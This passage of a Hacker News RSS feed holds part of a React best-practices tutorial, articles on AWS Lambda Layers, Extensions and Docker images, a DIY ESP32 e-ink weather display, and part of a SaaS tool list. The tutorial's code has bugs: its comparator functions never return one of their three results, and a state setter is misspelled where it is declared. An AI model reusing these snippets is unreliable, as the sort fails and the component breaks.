</span><span>render</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>9</span><span>    </span><span>return</span><span> </span><span>&lt;</span><span>button onClick</span><span>=</span><span>{</span><span>this</span><span>.</span><span>handleClick</span><span>}</span><span>&gt;</span><span>Click</span><span> me</span><span>!</span><span>&lt;</span><span>/</span><span>button</span><span>&gt;</span><span>;</span><span></span></p><p><span>10</span><span>  </span><span>)</span><span>;</span><span></span></p><p><span>11</span><span></span><span>}</span></p></pre></div><p>That‚Äôs as simple it can get! You don‚Äôt need to worry about binding functions in your constructor.</p><h2 id="3-use-react-hooks-to-update-your-state">#3: Use React hooks to update your state</h2><p>Since React version 16.8.0, it‚Äôs now possible to use state and lifecycle methods inside functional components using React Hooks. In other words, we can write better readable code that‚Äôs also much easier to maintain.</p><p>For this, we‚Äôll be using the <code>useState</code> hook. For those that are not aware of what a hook is and why you would use it. Here‚Äôs a short definition from the <a href="https://reactjs.org/docs/hooks-state.html#whats-a-hook" target="_blank" rel="noreferrer">React documentation</a>.</p><blockquote><p><strong>What is a Hook?</strong> A Hook is a special function that lets you ‚Äúhook into‚Äù React features. For example, useState is a Hook that lets you add React state to function components.</p></blockquote><blockquote><p><strong>When would I use a Hook?</strong> If you write a function component and realize you need to add some state to it, previously you had to convert it to a class. Now you can use a Hook inside the existing function component.</p></blockquote><p>First, let‚Äôs take a look at how we update the state using the <code>setState</code> hook.</p><div><pre><p><span>1</span><span>this</span><span>.</span><span>setState</span><span>(</span><span>{</span><span></span></p><p><span>2</span><span>    errorMsg</span><span>:</span><span> </span><span>""</span><span>,</span><span></span></p><p><span>3</span><span>    items</span><span>:</span><span> </span><span>[</span><span>item1</span><span>,</span><span> item2</span><span>]</span><span></span></p><p><span>4</span><span></span><span>}</span><span>)</span><span>;</span></p></pre></div><p>Now, let‚Äôs make use of the <code>useState</code> hook. We need to import this hook from the <code>react</code> library. We can now declare new state variables and pass them an initial value. We‚Äôll use destructuring to get a variable for retrieving the value and one for setting the value (this one is a function). Let‚Äôs take a look at how we can do this for the above example.</p><div><pre><p><span>1</span><span>import</span><span> </span><span>React</span><span>,</span><span> </span><span>{</span><span> useState </span><span>}</span><span> </span><span>from</span><span> </span><span>"react"</span><span>;</span><span></span></p><p><span>2</span><span></span></p><p><span>3</span><span></span><span>const</span><span> </span><span>App</span><span> </span><span>=</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>4</span><span>  </span><span>const</span><span> </span><span>[</span><span>items</span><span>,</span><span> setIems</span><span>]</span><span> </span><span>=</span><span> </span><span>useState</span><span>(</span><span>[</span><span>]</span><span>)</span><span>;</span><span></span></p><p><span>5</span><span>  </span><span>const</span><span> </span><span>[</span><span>errorMsg</span><span>,</span><span> setErrorMsg</span><span>]</span><span> </span><span>=</span><span> </span><span>useState</span><span>(</span><span>""</span><span>)</span><span>;</span><span></span></p><p><span>6</span><span></span><span>}</span><span>;</span><span></span></p><p><span>7</span><span></span></p><p><span>8</span><span></span><span>export</span><span> </span><span>default</span><span> </span><span>App</span><span>;</span></p></pre></div><p>Now, you can directly access both constants <code>items</code> and <code>errorMsg</code> in your component.</p><p>Further, we can update the state inside a function like this:</p><div><pre><p><span>1</span><span>import</span><span> </span><span>React</span><span>,</span><span> </span><span>{</span><span> useState </span><span>}</span><span> </span><span>from</span><span> </span><span>"react"</span><span>;</span><span></span></p><p><span>2</span><span></span></p><p><span>3</span><span></span><span>const</span><span> </span><span>App</span><span> </span><span>=</span><span> </span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span></p><p><span>4</span><span>  </span><span>const</span><span> </span><span>[</span><span>items</span><span>,</span><span> setIems</span><span>]</span><span> </span><span>=</span><span> </span><span>useState</span><span>(</span><span>[</span><span>]</span><span>)</span><span>;</span><span></span></p><p><span>5</span><span>  </span><span>const</span><span> </span><span>[</span><span>errorMsg</span><span>,</span><span> setErrorMsg</span><span>]</span><span> </span><span>=</span><span> </span><span>useState</span><span>(</span><span>""</span><span>)</span><span>;</span><span></span></p><p><span>6</span><span></span></p><p><span>7</span><span>  </span><span>return</span><span> </span><span>(</span><span></span></p><p><span>8</span><span>    </span><span>&lt;</span><span>form</span><span>&gt;</span><span></span></p><p><span>9</span><span>        </span><span>&lt;</span><span>button onClick</span><span>=</span><span>{</span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>setItems</span><span>(</span><span>[</span><span>"item A"</span><span>,</span><span> </span><span>"item B"</span><span>]</span><span>)</span><span>}</span><span>&gt;</span><span></span></p><p><span>10</span><span>          </span><span>Set</span><span> items</span></p><p><span>11</span><span>        </span><span>&lt;</span><span>/</span><span>button</span><span>&gt;</span><span></span></p><p><span>12</span><span>    </span><span>&lt;</span><span>/</span><span>form</span><span>&gt;</span><span></span></p><p><span>13</span><span>  </span><span>)</span><span>;</span><span></span></p><p><span>14</span><span></span><span>}</span><span>;</span><span></span></p><p><span>15</span><span></span></p><p><span>16</span><span></span><span>export</span><span> </span><span>default</span><span> </span><span>App</span><span>;</span></p></pre></div><p>That‚Äôs how you can use state hooks.</p><h2 id="4-cache-expensive-operations-with-usememo">#4: Cache expensive operations with useMemo</h2><p>Memoization is an optimization technique to store the result of expensive operations. In other words, a sorting operation is often an expensive operation that requires a lot of processing. We don‚Äôt want to execute this expensive function for every page render.</p><p>Therefore, we can use the <code>useMemo</code> hook to remember the output when you pass the same parameters to the <a href="https://rossbulat.medium.com/how-to-memoize-in-react-3d20cbcd2b6e" target="_blank" rel="noreferrer">memoized function</a>. The <code>useMemo</code> hook accepts a function and the input parameters to remember. React refers to this as a dependencies array. Every value referenced inside the function should also appear in your dependencies array.</p><p>Here‚Äôs a simple, abstract example. We pass two parameters <code>a</code> and <code>b</code> to an expensive function. As the function uses both parameters, we‚Äôve to add them to the dependencies array for our <code>useMemo</code> hook.</p><div><pre><p><span>1</span><span>const</span><span> memoizedValue </span><span>=</span><span> </span><span>useMemo</span><span>(</span><span>(</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>computeExpensiveValue</span><span>(</span><span>a</span><span>,</span><span> b</span><span>)</span><span>,</span><span> </span><span>[</span><span>a</span><span>,</span><span> b</span><span>]</span><span>)</span><span>;</span></p></pre></div><h2 id="5-decouple-functions-into-pure-functions-to-improve-code-quality">#5: Decouple functions into pure functions to improve code quality</h2><p>As a general React best practice, you should decouple functions that don‚Äôt rely on your component. In other words, a function that doesn‚Äôt rely on any state or React hooks.</p><p>Therefore, a sorting function is an excellent example of a function that you can extract as a pure function. </p><p>You might wonder why you should embrace functional programming? </p><blockquote><p>Functional programming is the process of building software by composing pure functions, avoiding shared state, mutable data, and side-effects. Pure function are better readable and easier to test. Therefore, they improve code quality. - <a href="https://www.freecodecamp.org/news/intro-to-functional-programming-basics/" target="_blank" rel="noreferrer">freeCodeCamp</a></p></blockquote><p>Now, let‚Äôs apply this concept to React components. Here‚Äôs a function that can sit both inside a React component or outside. Both are comparison functions, which you can pass to an expensive sorting function, that accept two input parameters. As there‚Äôs no interaction with the state, we can extract both functions to pure functions. This allows us to place the pure functions in a separate file and import them in multiple locations if needed.</p><div><pre><p><span>1</span><span>function</span><span> </span><span>ascSort</span><span> </span><span>(</span><span>a</span><span>,</span><span> b</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  </span><span>return</span><span> a </span><span>&lt;</span><span> b </span><span>?</span><span> </span><span>-</span><span>1</span><span> </span><span>:</span><span> </span><span>(</span><span>b </span><span>&gt;</span><span> a </span><span>?</span><span> </span><span>1</span><span> </span><span>:</span><span> </span><span>0</span><span>)</span><span>;</span><span></span></p><p><span>3</span><span></span><span>}</span><span></span></p><p><span>4</span><span></span></p><p><span>5</span><span></span><span>function</span><span> </span><span>descSort</span><span> </span><span>(</span><span>a</span><span>,</span><span> b</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>6</span><span>  </span><span>return</span><span> b </span><span>&lt;</span><span> a </span><span>?</span><span> </span><span>-</span><span>1</span><span> </span><span>:</span><span> </span><span>(</span><span>a </span><span>&gt;</span><span> b </span><span>?</span><span> </span><span>1</span><span> </span><span>:</span><span> </span><span>0</span><span>)</span><span>;</span><span></span></p><p><span>7</span><span></span><span>}</span></p></pre></div><h2 id="6-create-custom-react-hooks">#6: Create custom React hooks</h2><p>We‚Äôve learned how to use the <code>useState</code> and <code>useMemo</code> React hooks. Yet, React allows you to define your own React hooks to extract logic and make components more readable. </p><p>We can specify custom React hooks starting with the <code>use</code> keyword, like all other React hooks. It‚Äôs beneficial when you want to share logic between different functions. Instead of copying the function, we can define the logic as a React hook and reuse it in other functions.</p><p>Here‚Äôs an example of a React component that updates the state when the screen size gets reduced to below 600 pixels. If this happens, the <code>isScreenSmall</code> variable is set to <code>true</code>. Otherwise, the variable is set to <code>fa‚Ä¶</code></p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.asayer.io/6-react-best-practices-for-2021">https://blog.asayer.io/6-react-best-practices-for-2021</a></em></p>]]>
            </description>
            <link>https://blog.asayer.io/6-react-best-practices-for-2021</link>
            <guid isPermaLink="false">hacker-news-small-sites-26124742</guid>
            <pubDate>Sat, 13 Feb 2021 17:00:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Of recycling third-party code for AWS Lambda]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26124639">thread link</a>) | @kiyanwang
<br/>
February 13, 2021 | https://dashbird.io/blog/docker-lambda-extensions-layers/ | <a href="https://web.archive.org/web/*/https://dashbird.io/blog/docker-lambda-extensions-layers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
            <div>
                <div>

                    <div>
                        

                        
<p><em>In this article, I‚Äôm trying to shine some light on the AWS Lambda Layers, Lambda Extensions, and Docker image for Lambda, in order to add third-party code to Lambda.</em> <em>When and how to use which method, and when to mix and match?</em></p>



<p>Due to the circumstances in 2020, many software releases were postponed, and so the industry slowed its development speed quite a bit.</p>



<p>But at least at AWS, some teams got <a href="https://aws.amazon.com/blogs/aws/aws-reinvent-announcements-2020/" target="_blank" rel="noreferrer noopener">updates</a> out of the door at the end of the year. AWS Lambda got two significant improvements. <a href="https://aws.amazon.com/blogs/compute/introducing-aws-lambda-extensions-in-preview/" target="_blank" rel="noreferrer noopener">AWS Lambda Extensions</a> and the <a href="https://dashbird.io/blog/deploying-aws-lambda-with-docker/" target="_blank" rel="noreferrer noopener">support of Docker images for your Lambda functions</a>. Thanks to these two new features and Lambda Layers, <strong>we now have three ways to add code to Lambda that isn‚Äôt directly part of our Lambda function</strong>.</p>



<p>The question now is: <strong>When should we use what?</strong></p>



<p>First things first. All these Lambda features <strong>can be used together</strong>. So if you‚Äôre thinking about where to put your code, at least your decisions aren‚Äôt mutually exclusive. You can upload a Docker image and attach a regular <a href="https://dashbird.io/knowledge-base/aws-lambda/lambda-layers/" target="_blank" rel="noreferrer noopener">Lambda Layer</a> and a Lambda Extension. The same is possible if your Lambda function is based on a ZIP archive.</p>



<h2 id="h-lambda-functions-with-docker">Lambda Functions with Docker</h2>



<p>Let‚Äôs look at Lambda functions based on Docker images. Many developers adopted Docker containers into their development environment because it helps to <strong>replicate the production environment as closely as possible</strong>. After all, many services today are running on Kubernetes, which manages Docker containers.</p>



<p>AWS Lambda is a different approach to <a href="https://dashbird.io/knowledge-base/well-architected/monolith-vs-microservices" target="_blank" rel="noreferrer noopener">microservices</a>. It‚Äôs not based on long-running containers but <strong>short-lived functions</strong>. It comes with its own way of doing development, and so people couldn‚Äôt use their Docker skills anymore. But since re:invent 2020, AWS Lambda supports Docker images to cater to developers‚Äô needs who are already used to a Docker-based development workflow.</p>



<p>Instead of packing your function code into a ZIP archive, you can also pack it into a Docker image. In the opinion of many serverless advocates, this is just seen as a <strong>way to pull in legacy developers from the ‚Äúcontainer world‚Äù</strong> to serverless. Still, it also has a crucial benefit: You get <a href="https://aws.amazon.com/blogs/aws/new-for-aws-lambda-functions-with-up-to-10-gb-of-memory-and-6-vcpus/" target="_blank" rel="noreferrer noopener">10GB of space</a>.</p>



<p>That‚Äôs right, your Docker images for Lambda can be <strong>significantly larger than your ZIP archives</strong>, which only allow for 250MB of unzipped code and assets. Sometimes this is just how things are; you pull in a huge dependency and you‚Äôre over 250MB in no time. This is also an important factor for legacy systems. When you have a Docker image that you used for many years now, it can very well be that size wasn‚Äôt much of a concern for you in the past.  So <strong>getting all that code down to 250MB just isn‚Äôt possible</strong>; it would require you to do a big refactor into many functions.&nbsp;</p>



<p>So if you have a specific use-case that requires more than 250MB, you just won‚Äôt get around Docker images for your Lambda function. When your whole <strong>image is already based on other Docker images</strong>, that keep track of <strong>monitoring</strong> and other things <strong>not directly related to your function code</strong>, you‚Äôre also better off using Docker for your Lambda function instead of trying to refactor everything to fit into Lambda Layers or Extensions.</p>



<p>One note, though: <strong>Your container image has to implement the Lambda runtime API</strong>. You can‚Äôt run any Docker image on Lambda; it <strong>has to get Lambda events via the runtime API</strong>. Your containers won‚Äôt run indefinitely; like ZIP-based Lambda functions, they will be paused and subjected to <a href="https://dashbird.io/knowledge-base/aws-lambda/cold-starts/" target="_blank" rel="noreferrer noopener">cold starts</a>. 15 minutes is the maximum allowed time for a function.</p>



<h2 id="h-lambda-layers">Lambda Layers</h2>



<p><a href="https://dashbird.io/knowledge-base/aws-lambda/lambda-layers/" target="_blank" rel="noreferrer noopener">AWS Lambda Layers</a> are helpful in multiple ways. The most prevalent way layers are used is for <strong>custom runtimes</strong>. This means you can <strong>create a layer for a programming language that isn‚Äôt officially supported for AWS</strong>. There are even runtime layers with community support, so if you‚Äôre lucky, you can just pull an open-source runtime and start writing code in the programming language of your choice.</p>



<p>The other way layers are used to <strong>share code between Lambda functions</strong>. The code of a layer will be available when your function runs, so you can <strong>import it as if it were part of your function</strong>, but since it is encapsulated in a layer, you can <strong>maintain it in a separate place</strong>. If you‚Äôve got a library, a framework, or just a utils folder with code that gets used all over your Lambda functions, you could <strong>pack it into a layer</strong>.</p>



<p>While <strong>layers can be used together with Docker images</strong>, you can see them as separate ways to do the same thing.</p>



<p>If you‚Äôre starting a new project, put your functions into ZIP archives and use Lambda layers to factor out code used in multiple places. Provided you can get away with the 250MB limit. This limit is for your whole function with all of its layers, of which every function can have five. This means you can‚Äôt have five layers, each 250MB, but the <strong>sum of your function code and layers has to be below 250MB</strong>.</p>



<p>If you require <strong>more than 250MB</strong> or simply have a Docker-based legacy code-base that would never fit into 250MB, <strong>you‚Äôre better off with Docker than with a big refactor</strong>. At least in the short term. You can factor your libraries out into Docker images that become the base of all your Lambda functions, instead of using Lambda layers and won‚Äôt have to fight with the five-layers-per-function limit.</p>



<h2 id="h-lambda-extensions">Lambda Extensions</h2>



<p>Lambda Extensions are <strong>based on Lambda Layers</strong>, so if you want an extension to your Lambda function but can‚Äôt find that option in the AWS Console, it‚Äôs because an <strong>extension is simply a layer</strong>.</p>



<p>Extensions are a special layer because they <strong>don‚Äôt just supply your function with a custom runtime or shared code</strong>. Extensions can run in the same process as your Lambda function and in a separate process. This separate process is started before your Lambda function is executed and stopped after it finishes.</p>



<p>Running in a <strong>separate process </strong>enables Lambda Extensions to do things that regular layers couldn‚Äôt do. For example, gathering secrets from somewhere before your function does its work, or tracking the time your function runs and gather errors when it fails. Since an extension runs in its own process, a <strong>Lambda function crash usually won‚Äôt crash the extension</strong>, so it can take its time to find out what went wrong and send it to your monitoring service.</p>



<p>So if you have code that is concerned with monitoring or observability, or needs to perform actions before or after multiple functions run, you should <strong>consider putting that code into a Lambda Extension</strong>.</p>



<h2 id="h-operating-for-a-resilient-and-cost-efficient-lambda">Operating for a resilient and cost-efficient Lambda</h2>



<p>Whichever way you decide to architect your system, the chances are you‚Äôll as much as you‚Äôll be enjoying the benefits of Lambda, you‚Äôll also be affected by its notorious cold starts and latency, which can slow you down and stop you from getting the most of your serverless application.</p>



<p>Dashbird‚Äôs tailing functionality offers a real-time insight into the functions you‚Äôre running, and it provides you with all the crucial logs and metrics immediately out of the box and all in one place. <strong>It makes quite a big difference in helping you navigate serverless.</strong></p>



<p>You‚Äôll get aggregated Lambda performance and resource usage data for easy analysis on:</p>



<ul><li>Invocations (total count of)<ul><li>Successful requests</li><li>Errors</li><li>Cold starts</li></ul></li><li>Memory usage<ul><li>Average</li><li>Maximum</li><li>Minimum</li><li>99th percentile</li></ul></li><li>Duration<ul><li>Average</li><li>Maximum</li><li>Minimum</li><li>99th percentile</li></ul></li><li>Cost<ul><li>Aggregated billed execution time</li></ul></li></ul>



<figure><img loading="lazy" width="1024" height="640" src="https://dashbird.io/wp-content/uploads/2020/12/dashboard-2048x1279-1-1-1024x640.png" alt="dashbird dashboard" srcset="https://dashbird.io/wp-content/uploads/2020/12/dashboard-2048x1279-1-1-1024x640.png 1024w, https://dashbird.io/wp-content/uploads/2020/12/dashboard-2048x1279-1-1-300x187.png 300w, https://dashbird.io/wp-content/uploads/2020/12/dashboard-2048x1279-1-1-768x480.png 768w, https://dashbird.io/wp-content/uploads/2020/12/dashboard-2048x1279-1-1-1536x959.png 1536w, https://dashbird.io/wp-content/uploads/2020/12/dashboard-2048x1279-1-1-500x312.png 500w, https://dashbird.io/wp-content/uploads/2020/12/dashboard-2048x1279-1-1.png 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>







<h2 id="h-summary">Summary</h2>



<p>To sum it all up, you should see Docker images mainly as a way to get more <strong>code deployed</strong> or an easier way to <strong>port legacy container code-bases to AWS Lambda</strong>. The 250MB of ZIP deployments often won‚Äôt cut it, and the 10GB of a Docker image is the only way around it.</p>



<p><strong>Lambda Layers</strong> are a way to add libraries, frameworks, util-folders, and custom runtimes to your Lambda function.</p>



<p>Lambda Extensions are Lambda Layers that can run in a separate process, which allows them to perform actions before and after a function executes. Use-cases are monitoring or secret gathering.</p>



<p>With this knowledge, you‚Äôre now able to structure your Lambda code in a meaningful way and won‚Äôt despair when you hit a code size limit.</p>



<hr>



<p>Further reading:</p>



<p><a href="https://dashbird.io/blog/using-lambda-layers-for-better-serverless-architecture/" target="_blank" rel="noreferrer noopener">Using Lambda Layers for Better Serverless Architecture</a></p>



<p><a href="https://dashbird.io/blog/deploying-aws-lambda-with-docker/" target="_blank" rel="noreferrer noopener">Deploying AWS Lambda with Docker Containers</a></p>
                    </div>

                </div>
            </div>
        </section><div data-post="4435">
            <h2>Read our blog</h2>

            <div>
                            <div>
                    <p><img src="https://dashbird.io/wp-content/uploads/2021/02/aws-well-architected-framework-cost-21.png" alt="">
                    </p>
                    <h3>Bullet-Proofing Serverless Infrastructures with Failure and Threat Detection</h3>
                    <p>In serverless, it‚Äôs challenging but crucial to stay on top of what‚Äôs going on in your infrastructure at all times. <strong>Adding a monitoring solution</strong> to your stack, which offers a pre-configured serverless failure detection, should be <strong>one of the first decisions</strong>.</p>
                    </div>
                            <div>
                    <p><img src="https://dashbird.io/wp-content/uploads/2021/02/aws-well-architected-framework-cost-20.png" alt="">
                    </p>
                    <h3>How I Manage Credentials in Python Using AWS Secrets Manager</h3>
                    <p>In this tutorial, we‚Äôre looking at the AWS Secrets Manager as a way of managing credentials in Python scripts, with an example use case.</p>
                    </div>
                            <div>
                    <p><img src="https://dashbird.io/wp-content/uploads/2021/02/aws-well-architected-framework-cost-19.png" alt="">
                    </p>
                    <h3>7 Reasons Why Serverless Encourages Useful Engineering Practices</h3>
                    <p>In this article, we list the seven reasons why and how <strong>serverless enables</strong> useful engineering practices.</p>
                    </div>
                        </div>
            </div></div>]]>
            </description>
            <link>https://dashbird.io/blog/docker-lambda-extensions-layers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26124639</guid>
            <pubDate>Sat, 13 Feb 2021 16:48:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Low Power eInk Weather Gadget]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26124583">thread link</a>) | @dmi3
<br/>
February 13, 2021 | https://developer.run/52 | <a href="https://web.archive.org/web/*/https://developer.run/52">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

		<section>
			<div>
				<h2><a href="https://developer.run/52">Low power eInk Weather Gadget</a></h2>

					<div>
            <p><a href="#weather1_preview">
              <img src="https://developer.run/pic/weather1-300x.png" alt="Weather Gadget on LilyGO T5s V2.8 Thumbnail">
            </a></p><p>Weather Gadget on LilyGO T5s V2.8</p>
        </div>
        <p><a href="#_" id="weather1_preview">
          <img src="https://developer.run/pic/weather1.jpeg" alt="Weather Gadget on LilyGO T5s V2.8">
        </a></p>

<p>Taking a glance at the weather when leaving your cozy bunker is a very useful thing. It allows you to prepare for the ever-changing conditions and select protective gear according to the situation. You definitely need one!</p>

<p>To achieve that, of course, you can use your portable computing device (aka smartphone). But trust me, it is much more convenient when a nifty screen describing current and predicted weather condition resides on a shelf near the exit airlock. </p>

<p>As information is rarely updated, the natural choice for display is e-ink technology. A lot of engineers are using Raspberry Pi to drive it. But even Pi Zero is too much overhead for the simple task of downloading JSON file and presenting it on the screen (and I'm not even speaking about bringing node.js to the equation). It is like using a sixteen wheeler for door-to-door pizza delivery.</p>

<p>Much more suitable for the job is ESP32 system-on-a-chip. Recently I've discovered awesome boards from <a href="http://www.lilygo.cn/prod_view.aspx?TypeId=50031&amp;Id=1148&amp;FId=t3:50031:3">LilyGO</a>. It has an 2.7" white/black/red e-ink display and wifi/bluetooth. Boards are programmable from Arduino IDE without shady software. Could be powered from literary everything: power bank, battery salvaged from your old mp3 player, LIR2450 coin cell battery... As it refreshes once in an hour you will get months of runtime - so combined with wifi - no wires on your shelf. Also, it has an sd card reader, 4 programmable buttons and pins for the speaker and microphone, in case you want some extra functionality.</p>

<!--more --><div id="more">

<p>Board comes assembled, with an e-ink display. From your side, you only need to connect to <a href="https://gist.github.com/dmi3/26d3924f5b4600e5dc5197d1c3da7f43#user-content-battery">power source</a> (connector included, just connect wires together) and upload some software. LilyGO will take care of charging your battery (up to 500mA). See:</p>

<p><a href="https://gist.github.com/dmi3/26d3924f5b4600e5dc5197d1c3da7f43#weather-gadget">‚Üí Bill of materials</a></p>

<p>Uploading software is easy. Just connect the board to a USB port and upload via Arduino IDE (no need to flash sd card). There is a lot of weather display code in the web. I've <a href="https://github.com/dmi3/weather">modified one of examples a bit</a> to show data useful to me.  See setup instructions and troubleshooting on <a href="https://github.com/dmi3/weather#readme">GitHub</a>. In my case display looks like this:</p>

<div>
            <p><a href="#weather3_preview">
              <img src="https://developer.run/pic/weather3-300x.png" alt="Weather Gadget Thumbnail">
            </a></p><p>Weather Gadget</p>
        </div>
        <p><a href="#_" id="weather3_preview">
          <img src="https://developer.run/pic/weather3.jpeg" alt="Weather Gadget">
        </a></p>

<ol>
<li>Red Alerts for the weather if any</li>
<li>Current temperature (and "feels like" temperature)</li>
<li>Humidity and wind</li>
<li>Temperature graph in next 24 hours</li>
<li>Probability of precipitation in next 24 hours</li>
</ol>

<p>The software connects to your wifi, downloads the latest data from <a href="https://openweathermap.org/">OpenWeather API</a>, redraws the e-ink display, then goes to sleep for 30 minutes. I've also added ping to <a href="https://healthchecks.io/">Healthchecks.io</a>. If the board will not ping it for some time (because of a dead battery or software error), I will get a notification to my email from Healthchecks.io.</p>

<p><a name="github" href="https://github.com/dmi3/weather">Source on Github</a></p>

<p>Of course, you can put the board in some photo frame as people usually tend to do. But for me, the current aesthetic looks cool. Also, the weather is just one of the examples of what you can do with this awesome board. See <a href="https://github.com/Xinyuan-LilyGO/LilyGo-T5-Epaper-Series">more examples</a>.</p>

<p><a rel="tag" href="https://www.google.com/search?q=site:developer.run+%22%23DIY%22">#DIY</a> <a rel="tag" href="https://www.google.com/search?q=site:developer.run+%22%23ESP32%22">#ESP32</a> <a rel="tag" href="https://www.google.com/search?q=site:developer.run+%22%23LilyGO%22">#LilyGO</a></p>

<hr>


					<hr>

					
					<div id="featured">
						<p><a href="https://developer.run/50"><img src="https://developer.run/pic/pi/title.jpeg"></a></p>
					</div>			
			</div>

		</div></section>
		

		<section>
			<div>
				<div>
					<h2>Contact</h2>
					<p><img src="https://developer.run/pic/dima.png">
				</p></div>
				
			</div>
		</section>


		<section>
			<div>
                <p>
                    ¬© 20xx
                </p>
                <p>
                    Hosted on <a href="https://surge.sh/">surge.sh</a>, which is awesome!
                </p>

			</div>
		</section> 
	</div></div>]]>
            </description>
            <link>https://developer.run/52</link>
            <guid isPermaLink="false">hacker-news-small-sites-26124583</guid>
            <pubDate>Sat, 13 Feb 2021 16:39:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A SaaS Solopreneur's Toolkit]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26124455">thread link</a>) | @jnfr
<br/>
February 13, 2021 | https://lunchmoney.app/stack | <a href="https://web.archive.org/web/*/https://lunchmoney.app/stack">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="tech">
  
  <a href="https://nodejs.org/" target="_blank">
    <p>tech</p>
    <div>
      <h2>Node.js</h2>
      <p>JavaScript runtime environment used to power the back-end servers</p>
    </div>
    
     <span>Open source</span>
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://reactjs.org/" target="_blank">
    <p>tech</p>
    <div>
      <h2>React</h2>
      <p>JavaScript library by Facebook used to build the front-end</p>
    </div>
    
     <span>Open source</span>
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://www.postgresql.org/" target="_blank">
    <p>tech</p>
    <div>
      <h2>PostgreSQL</h2>
      <p>Advanced and enterprise-class relational database used to store Lunch Money data</p>
    </div>
    
     <span>Open source</span>
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://redis.io/" target="_blank">
    <p>tech</p>
    <div>
      <h2>Redis</h2>
      <p>Robust in-memory data structure store used as a messaging system and queues</p>
    </div>
    
     <span>Open source</span>
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://www.typescriptlang.org/" target="_blank">
    <p>tech</p>
    <div>
      <h2>Typescript</h2>
      <p>A programming language by Microsoft which improves on JavaScript</p>
    </div>
    
     <span>Open source</span>
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://sass-lang.com/" target="_blank">
    <p>tech</p>
    <div>
      <h2>SCSS</h2>
      <p>A must-have extension to CSS (seriously, don't use vanilla CSS)</p>
    </div>
    
     <span>Open source</span>
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://jekyllrb.com/" target="_blank">
    <p>tech</p>
    <div>
      <h2>Jekyll</h2>
      <p>Static site generator powering the main marketing site</p>
    </div>
    
     <span>Open source</span>
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://gohugo.io/" target="_blank">
    <p>tech</p>
    <div>
      <h2>Hugo</h2>
      <p>Static site generator powering the founder's personal blog</p>
    </div>
    
     <span>Open source</span>
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://heroku.com/" target="_blank">
    <p>platforms</p>
    <div>
      <h2>Heroku</h2>
      <p>Cloud platform used to deploy and manage Lunch Money's staging, beta and production servers</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://netlify.com/" target="_blank">
    <p>platforms</p>
    <div>
      <h2>Netlify</h2>
      <p>Web developer platform for effortless deployments of the client-side</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://plaid.com/" target="_blank">
    <p>api</p>
    <div>
      <h2>Plaid</h2>
      <p>API to importing transactions and balances for US and Canadian-based banks</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://zabo.com/" target="_blank">
    <p>api</p>
    <div>
      <h2>Zabo</h2>
      <p>API to import balances from cryptocurrency wallets and exchanges</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://fixer.io/" target="_blank">
    <p>api</p>
    <div>
      <h2>Fixer.io</h2>
      <p>API for importing daily currency exchange rates</p>
    </div>
    
    <span>Bootstrapped</span> 
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://twilio.com/" target="_blank">
    <p>api</p>
    <div>
      <h2>Twilio</h2>
      <p>Communications API for sending 2FA codes vis SMS</p>
    </div>
    
     
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://postmarkapp.com/" target="_blank">
    <p>api</p>
    <div>
      <h2>Postmark</h2>
      <p>Email API for sending transactional emails</p>
    </div>
    
    <span>Bootstrapped</span> 
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://optimalbits.github.io/bull/" target="_blank">
    <p>utilities</p>
    <div>
      <h2>Bull</h2>
      <p>Node.js library to implement, manage and interface with Redis queues</p>
    </div>
    
     <span>Open source</span>
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://mochajs.org/" target="_blank">
    <p>utilities</p>
    <div>
      <h2>Mocha</h2>
      <p>Testing framework for Node.js</p>
    </div>
    
     <span>Open source</span>
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="http://www.passportjs.org/" target="_blank">
    <p>utilities</p>
    <div>
      <h2>passport.js</h2>
      <p>Node.js middleware powering the authentication layer</p>
    </div>
    
     <span>Open source</span>
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://github.com/svg/svgo" target="_blank">
    <p>utilities</p>
    <div>
      <h2>svgo</h2>
      <p>A great little command line utility to minimize the size of svg files</p>
    </div>
    
     <span>Open source</span>
    <!-- <span class="credit">Test</span> -->
  </a>
  
  <a href="https://github.com/" target="_blank">
